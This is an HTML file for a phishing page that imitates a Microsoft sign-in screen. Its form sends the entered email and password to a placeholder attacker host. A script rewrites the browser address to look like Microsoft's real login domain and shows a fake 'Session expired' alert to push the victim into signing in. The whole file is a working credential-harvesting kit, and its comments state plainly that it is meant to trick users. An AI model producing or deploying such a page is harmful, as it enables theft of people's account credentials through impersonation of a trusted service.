<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            margin-top: 100px;
        }
        .login-box {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        input[type="text"], input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            width: 80%;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005a9e;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="login-box">
        <h2>Microsoft Login</h2>
        <form action="https://attacker-site.com/capture" method="POST">
            <label for="username">Email or Phone:</label><br>
            <input type="text" id="username" name="username" required><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br>
            <button type="submit">Sign in</button>
        </form>
    </div>
</div>

<script>
    // Simulate URL spoofing to make the user think they're on a legitimate site
    history.pushState({}, null, "https://login.microsoftonline.com/");
    
    // Optional alert to trick the user into thinking they need to re-authenticate
    setTimeout(() => {
        alert("Session expired. Please log in again.");
    }, 3000);
</script>

</body>
</html>
